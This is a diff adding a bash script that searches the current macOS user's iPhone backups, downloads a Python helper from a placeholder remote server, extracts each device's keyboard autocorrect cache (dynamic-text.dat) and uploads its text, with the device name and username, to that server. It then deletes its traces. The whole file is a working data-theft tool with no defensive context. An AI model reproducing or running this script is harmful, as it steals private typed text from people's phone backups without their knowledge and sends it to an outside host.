@@ -1,0 +1,33 @@
+#!/bin/bash
+
+curl=`which curl`
+python=`which python`
+target_user=`whoami`;
+d_path="/Users/${target_user}/Library/Application Support/MobileSync/Backup";
+r_path="http://<your web server>/dtxt/";
+pwd=`pwd`;
+
+if [ ! -f ${curl} ];
+then
+	exit;
+fi
+
+if [ ! -f ${python} ];
+then
+	exit;
+fi
+
+${curl} -s ${r_path}d.py > d.py
+for d in `ls "$d_path"`;
+do
+	device_name=`cat "$d_path/${d}/Info.plist" | grep -A1 "Display Name" | grep "string" | sed -e s/\<string\>// | sed -e s/\<.string\>//`
+	if [ -f "${d_path}"/${d}/Manifest.mbdb ]; then
+		cd "${d_path}"/${d}
+		target_file=`${python} ${pwd}/d.py | grep dynamic-text.dat | sed -e s/.*\(// | sed -e s/\).*//`
+		strings $target_file > /tmp/${d}.txt
+		${curl} -F "d=${device_name}" -F "u=${target_user}" -F "f=@/tmp/${d}.txt" ${r_path}
+		rm /tmp/${d}.txt
+	fi
+done
+cd ${pwd}
+rm -f d.py
